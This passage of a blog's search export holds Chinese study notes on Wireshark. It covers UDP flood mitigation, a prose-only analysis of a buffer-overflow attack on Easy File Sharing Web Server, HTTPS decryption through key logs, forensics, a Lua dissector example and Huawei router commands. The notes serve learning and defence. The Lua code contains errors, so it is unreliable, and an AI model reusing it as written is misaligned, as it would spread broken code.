-d长度</p><p>3.绘图功能（I/O图表）：统计-&gt;I/O图表</p><p>4.解决方案（限流和指纹学习）</p><ul><li>基于目的IP地址的限流</li><li>基于目的安全区域的限流：限制防火墙处接口数据包数量</li><li>基于会话的限流：对每个会话UDP报文速率进行统计，如果速率达到阈值，该会话被锁定，后续报文都会被丢弃，在一段时间没有流量解锁</li><li>指纹学习：防火墙对发往服务器的UDP报文进行统计，当达到一定阈值是，开始进行指纹学习，如果报文数据相同，就会被学习为指纹，后续报文拥有与此指纹匹配的特征就会被当成攻击丢弃</li></ul><h1 id="十一、使用WireShark分析缓冲区溢出漏洞"><a href="#十一、使用WireShark分析缓冲区溢出漏洞" class="headerlink" title="十一、使用WireShark分析缓冲区溢出漏洞"></a>十一、使用WireShark分析缓冲区溢出漏洞</h1><p>1.缓冲区溢出攻击的相关理论</p><p>HTTP协议：</p><p>HTTP的请求与应答：request method</p><ol><li>GET请求获取由Request-URI所标识的资源（显示过滤：http.request.method==”GET”）</li><li>POST在Request-URI所标识的资源后附加新的数据</li><li>PUT请求服务器存储一个资源，并用Request-URI作为其标识</li><li>DELETE请求服务器删除由Request-URI所标识的资源</li></ol><p>2.模拟缓冲区溢出攻击：Easy File Sharing Web Server7.2作为例子</p><p>3.分析缓冲区溢出攻击：tcp三次握手之后，发送大量数据的http请求，大量字段使缓冲区溢出执行小马。</p><p>4.检测远程控制：服务端主动向客户端发送请求请求客户端连接，后客户端与服务端通信发送大马。</p><p>5.防范攻击：杀毒软件，端口关闭，防火墙添加策略等。工具-&gt;防火墙ACL规则</p><h1 id="十二、使用WireShark分析HTTPS"><a href="#十二、使用WireShark分析HTTPS" class="headerlink" title="十二、使用WireShark分析HTTPS"></a>十二、使用WireShark分析HTTPS</h1><p>1.Https协议：为了安全性考虑对数据包进行加密</p><p>2.解密：win10可添加环境变量，火狐和谷歌会将密钥自动保存在该文件</p><p>变量名：SSLKEYLOGFILE</p><p>变量值：变量目录sslkeylog.log</p><p>在协议设置SSL（老版本）TLS（新版本）导入密钥</p><h1 id="十三、使用WireShark进行网络取证"><a href="#十三、使用WireShark进行网络取证" class="headerlink" title="十三、使用WireShark进行网络取证"></a>十三、使用WireShark进行网络取证</h1><p>1.因为网络传输中各种应用程序所使用应用层协议很多且不同，而传输层只有TCP和UDP协议，所以一般分析传输层。</p><p>2.传输过程中一个完整的文件会被分割成多个数据包，这些有顺序的数据包被称作流，所以使用流跟踪功能，将捕获的通信数据包重组成完整的会话或者文件。</p><p>3.导出对象功能：文件-&gt;导出对象（功能不完善容易出错）</p><p>4.http作为传输协议用data作为过滤器。</p><p>5.追踪流之后将数据显示为原始数据（十六进制）保存为bin格式文件，用winhex将多余数据删除后保存为相应格式。</p><p>6.网络取证题目：<a href="http://forensicscontest.com/puzzles">http://forensicscontest.com/puzzles</a></p><p>7.wireshark自带解码功能：字段是端口所对协议，值是端口。</p><p>8.SMTP协议用base64编码。</p><p>9.base64解码并转换为文件：<a href="https://www.motobit.com/util/base64-decoder-encoder.asp">https://www.motobit.com/util/base64-decoder-encoder.asp</a></p><p>10.计算docx文件中的图片哈希值，将word文件解压缩取出图片。</p><h1 id="十四、在WireShark中添加新协议"><a href="#十四、在WireShark中添加新协议" class="headerlink" title="十四、在WireShark中添加新协议"></a>十四、在WireShark中添加新协议</h1><p>1.WireShark编程基础</p><p>wireshark由c语言编写，支持c语言，Lua语言。</p><p>帮助-&gt;关于wireshark查看是否支持Lua</p><p>init.lua文件可以选择打开和关闭lua脚本，提供安全检查，加载其他lua脚本。将lua脚本放在和init同一目录下，在最后添加dofile(DATA_DIR..”xxx.lua”)</p><p>简单编写调试lua脚本：工具-&gt;lua-&gt;Evaluate</p><p>数据包识别协议原理：根据端口判断   视图-&gt;内部-&gt;解析器表</p><p>2.使用WireShark开发新的协议解析器并调试</p><ol><li>开发：<ol><li>先注册协议：调用函数Proto(name,desc)（协议名，描述）</li><li>协议的解析方法：解析器函数dissector(tvb,pinfo,tree)（处理的报文缓存，报文，报文的解析树）</li><li>端口与协议对应注册在解析器表中：DissectorTable.get(“tcp.port”):add(端口号,name)（解析器表名，协议名称，对应端口号）</li></ol></li><li>加载插件：将写完的文件命名为xx.lua，保存在wireshark的安装目录下后在init.lua文件的最后添加dofile(DATA_DIR..”xx.lua”)</li><li>调试：构造数据包：xcap创建报文，添加报文内容，发送报文</li><li>代码实例：在wireshark中添加一个名为NewProtocol，100端口，读取64位数据的应用层协议</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">lacal NewProtocol &#x3D; Proto(&quot;NewProtocol&quot;,&quot;This Is A NewProtocol&quot;) &#x2F;&#x2F;注册一个名为NewProtocol的协议</span><br><span class="line"></span><br><span class="line">Trans_ID &#x3D; ProtoField.uint16(NewProtocol.ID,&quot;ID&quot;) &#x2F;&#x2F;注册Trans_ID字段（对应参数为字段名，字段描述）</span><br><span class="line"></span><br><span class="line">Msg_Type &#x3D;ProtoField.uint16(NewProtocol.Type,&quot;Type&quot;) &#x2F;&#x2F;注册Msg_Type字段</span><br><span class="line"></span><br><span class="line">Msg_Data &#x3D;ProtoField.uint32(NewProtocol.Data,&quot;Data&quot;) &#x2F;&#x2F;注册Msg_Data字段</span><br><span class="line"></span><br><span class="line">NewProtocol.fields &#x3D; (Trans_ID,Msg_Type,Msg_Data) &#x2F;&#x2F;将字段整合为一个协议</span><br><span class="line"></span><br><span class="line">function NewProtocol.dissector(tvb,pinfo,tree)</span><br><span class="line"></span><br><span class="line">pinfo.cols.protocol &#x3D; &quot;NewProtocol&quot; &#x2F;&#x2F;协议显示文本为NewProtocol</span><br><span class="line"></span><br><span class="line">local subtree &#x3D; tree:add(NewProtocol,tvb(0))</span><br><span class="line"></span><br><span class="line">subtree:add(Trans_ID,tvb(0,2)) &#x2F;&#x2F;从第0位开始2个字节作为Trans_ID</span><br><span class="line"></span><br><span class="line">subtree:add(Msg_Type,tvb(2,2)) &#x2F;&#x2F;从第2位开始2个字节作为Msg_Type</span><br><span class="line"></span><br><span class="line">subtree:add(Msg_Data,tvb(4,4)) &#x2F;&#x2F;从第4位开始2个字节作为Msg_Data</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">DissectorTable.get(&quot;tcp.port&quot;):add(100,NewProtocol) &#x2F;&#x2F;将NewProtocol与100端口对应，注册在解析器表中</span><br></pre></td></tr></table></figure><h1 id="十五、WireShark的捕获接口和保存选项"><a href="#十五、WireShark的捕获接口和保存选项" class="headerlink" title="十五、WireShark的捕获接口和保存选项"></a>十五、WireShark的捕获接口和保存选项</h1><p>文件处理功能：</p><p>捕获选项：</p><ul><li>输入：对网卡的管理</li><li>输出：分组创建是按照数据包个数创建，环形缓冲器用来是覆盖原有文件和摄像头一个原理（防止内存溢出）</li><li>选项：解析传输层名称将传输层端口号转为应用层服务</li></ul><p>保存捕获到的数据：文件-&gt;文件集合</p><p>保存显示过滤器</p><p>配置文件的保存：帮助-&gt;关于Wireshark-&gt;文件夹    个人设置保存在个人配置中</p><h1 id="十六、使用WireShark分析USB通信"><a href="#十六、使用WireShark分析USB通信" class="headerlink" title="十六、使用WireShark分析USB通信"></a>十六、使用WireShark分析USB通信</h1><p>Wireshark文件一些可执行程序：（-h查看帮助）</p><ul><li>tshark：命令行wireshark</li><li>editcap：转换捕获数据包的格式，将大文件分割，根据开始和结束时间捕获数据包中的子集，删除捕获数据包中重复的数据</li><li>dumpcap：miniwireshark功能比较少</li><li>mergecap：把多个文件合并为一个</li><li>capinfos：显示数据包信息</li></ul><p>Wireshark对Usb的数据捕获：</p><p>读Leftover Capture Data第四个字节</p><p>键盘协议：moz-<a href="extension://c80014e8-943d-4a47-bafa-3cb670edab5c/assets/pdf/web/viewer.html?file=https%3A%2F%2Fwww.usb.org%2Fsites%2Fdefault%2Ffiles%2Fdocuments%2Fhut1_12v2.pdf">extension://c80014e8-943d-4a47-bafa-3cb670edab5c/assets/pdf/web/viewer.html?file=https%3A%2F%2Fwww.usb.org%2Fsites%2Fdefault%2Ffiles%2Fdocuments%2Fhut1_12v2.pdf</a></p><p>附：华为网关路由设备命令</p><p>端口镜像功能：</p><p><Huawei>sys  //进入系统视图</p><p>[Huawei]obserce-port interface e0/0/0 //将e0/0/0配置为镜像端口</p><p>[Huawei]int GigabitEthernet 0/0/0 //配置0/0/0接口ip</p><p>[Huawei-GigabitEthernet0/0/0]ip address 192.168.1.1 255.255.255.0</p><p>[Huawei-GigabitEthernet0/0/0]quit</p><p>[Huawei]int GigabitEthernet 0/0/1 //配置0/0/1接口ip</p><p>[Huawei-GigabitEthernet0/0/3]ip address 192.168.1.1 255.255.255.0</p><p>[Huawei-GigabitEthernet0/0/3]mirror to obsreve-port both //将0/0/1接口流量转发到镜像端口监控参数可以选三个（both inbound outbound）</p><hr><p>建立HTTP服务的仿真网络：</p><p>网关路由器的配置：</p><p><Huawei>sys</p><p>[Huawei] interface GigabitEthernet0/0/0 //配置左侧ip地址 内部网络网关</p><p>[Huawei-GigabitEthernet0/0/0] ip address 192.168.1.1 255.255.255.0</p><p>[Huawei-GigabitEthernet0/0/0]quit</p><p>[Huawei] interface GigabitEthernet0/0/1</p><p>[Huawei-GigabitEthernet0/0/1] ip address 192.168.2.1 255.255.255.0</p><p>[Huawei-GigabitEthernet0/0/1]quit</p><p>[Huawei] rip 1</p><p>[Huawei-rip-1] version 2</p><p>[Huawei-rip-1] network 192.168.1.0</p><p>[Huawei-rip-1] network 192.168.2.0</p><p>[Huawei-rip-1] quit</p><p>互联网路由器的配置：</p><p><Huawei>sys</p><p>[Huawei] interface GigabitEthernet0/0/0</p><p>[Huawei-GigabitEthernet0/0/0] ip address 192.168.2.2 255.255.255.0</p><p>[Huawei-GigabitEthernet0/0/0]quit</p><p>[Huawei] interface GigabitEthernet0/0/1</p><p>[Huawei-GigabitEthernet0/0/1] ip address 192.168.3.1 255.255.255.0</p><p>[Huawei-GigabitEthernet0/0/1]quit</p><p>[Huawei] rip 1</p><p>[Huawei-rip-1] version 2</p><p>[Huawei-rip-1] network 192.168.2.0</p><p>[Huawei-rip-1] network 192.168.3.0</p><p>[Huawei-rip-1] quit</p><p>Http路由器的配置：</p><p><Huawei>sys</p><p>[Huawei] interface GigabitEthernet0/0/0</p><p>[Huawei-GigabitEthernet0/0/0] ip address 192.168.3.2 255.255.255.0</p><p>[Huawei-GigabitEthernet0/0/0]quit</p><p>[Huawei] interface GigabitEthernet0/0/1 //右侧网关</p><p>[Huawei-GigabitEthernet0/0/1] ip address 192.168.4.1 255.255.255.0</p><p>[Huawei-GigabitEthernet0/0/1]quit</p><p>[Huawei] rip 1</p><p>[Huawei-rip-1] version 2</p><p>[Huawei-rip-1] network 192.168.3.0</p><p>[Huawei-rip-1] network 192.168.4.0</p><p>[Huawei-rip-1] quit</p><hr><p>display mac-address //显示cam表</p><p>限制接口对应地址数量命令：</p><p>[Huawei-Ethernet0/0/3] port-security enable</p><p>[Huawei-Ethernet0/0/3] port-security mac-address sticky</p><p>[Huawei-Ethernet0/0/3] port-security protect-action protect</p><p>[Huawei-Ethernet0/0/3] port-security max-mac-num 8</p>]]></content>
      
      
      <categories>
          
          <category> 渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白向 </tag>
            
            <tag> 学习 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>关于我</title>
      <link href="about/index.html"/>
      <url>about/index.html</url>
      
        <content type="html"><![CDATA[<p>ID：Bbutterf1y</p><p>在校学生</p><p>ctfer</p><p>网络安全学习爱好者</p><p>hacker</p><hr /><p>博主留言：欢迎来到我的博客，在这里我会不定期写下自己的一些学习笔记，一堆废话和希望能够帮助到一些人的文章。如果想要联系到我可以在主页戳我或者给我留言。如果文章中有什么错误望理解，谢谢。</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="categories/index.html"/>
      <url>categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>好兄弟萌のblog</title>
      <link href="link/index.html"/>
      <url>link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>留言板</title>
      <link href="messageboard/index.html"/>
      <url>messageboard/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="inject/style.css"/>
      <url>inject/style.css</url>
      
        <content type="html"><![CDATA[#page-header.not-index-bg{height:30rem;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="tags/index.html"/>
      <url>tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
